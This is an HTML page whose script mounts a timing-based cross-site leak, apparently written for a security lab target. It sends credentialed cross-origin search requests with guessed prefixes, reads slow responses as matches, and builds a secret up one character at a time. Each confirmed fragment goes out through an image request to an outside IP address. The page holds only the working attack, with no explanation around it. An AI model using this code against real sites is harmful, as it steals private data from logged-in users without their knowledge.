<html>
<body>
<script>

var all = "0123456789-abcdef".split("");
var base = "http://ptl-448d03cb-4ae66348.libcurl.so/search?search=^";
var counter = 0;
var cur = "";

function check(cur, counter) {
	url=base+cur+all[counter]
	var val = cur+all[counter];
	v=performance.now();
	fetch(url,
			{ method: 'GET', credentials: 'include', mode: 'no-cors' }
			).catch(err => {
				console.log("ERR"+val);
			}).then(response => {
				z=performance.now();
				if (z-v < 1000) {
					document.write("<br/>INVALID"+val+(z-v).toString());
				} else {
					document.write("<br/>FOUND"+val+(z-v).toString());
					document.write("<img src='http://110.174.84.28:1337/crossSiteLeak.html?leak="+val+"'/>");
					j=0;
					while (j < all.length) {
						check(val, j);
						j+=1;
					}
				}
			})
}
				

i = 0;
while (i < all.length) {
	setTimeout(check("",i),500*i);
	i+=1;
}

</script>
</body>
</html>
